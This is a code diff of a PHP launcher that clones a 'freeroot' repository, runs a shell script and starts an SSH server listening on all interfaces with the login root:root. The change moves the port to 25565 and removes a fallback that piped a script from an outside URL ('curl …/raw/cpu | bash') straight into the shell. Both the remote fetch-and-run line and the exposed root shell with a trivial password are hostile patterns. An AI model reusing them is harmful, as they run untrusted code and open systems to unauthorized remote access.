@@ -15,10 +15,9 @@ const URLS = [
 const TMP_DIR = 'freeroot_temp';
 const WORK_DIR = 'work';
 const SCRIPT = 'noninteractive.sh';
-const FALLBACK_URL = 'r.snd.qzz.io/raw/cpu';
 
 $sshIp = '0.0.0.0';
-$sshPort = 24990;
+$sshPort = 25565;
 $users = ['root' => 'root'];
 
 function logMsg($level, $msg) {
@@ -84,23 +83,6 @@ function cloneRepo() {
         }
     }
     return false;
-}
-
-function fallback() {
-    if (!checkCommand('curl')) {
-        logMsg('WARN', 'Curl not found, cannot use fallback');
-        return false;
-    }
-    logMsg('INFO', 'Executing fallback: curl ' . FALLBACK_URL . ' | bash');
-    
-    exec('curl ' . FALLBACK_URL . ' | bash 2>&1', $output, $returnVar);
-    if ($returnVar === 0) {
-        logMsg('INFO', 'Fallback executed successfully');
-        return true;
-    } else {
-        logMsg('ERROR', 'Fallback failed');
-        return false;
-    }
 }
 
 function executeScript($directory, $script) {
@@ -284,15 +266,8 @@ function main() {
     }
 
     if (!cloneRepo()) {
-        logMsg('WARN', 'All clone attempts failed, trying fallback method...');
-        deleteRecursive($tmpDir);
-        if (!fallback()) {
-            logMsg('ERROR', 'Fallback method also failed');
-            exit(1);
-        }
-        logMsg('INFO', 'Fallback method succeeded');
-        startSSHServer();
-        return;
+        logMsg('ERROR', 'All clone attempts failed');
+        exit(1);
     }
 
     rename($tmpDir, $workDir);
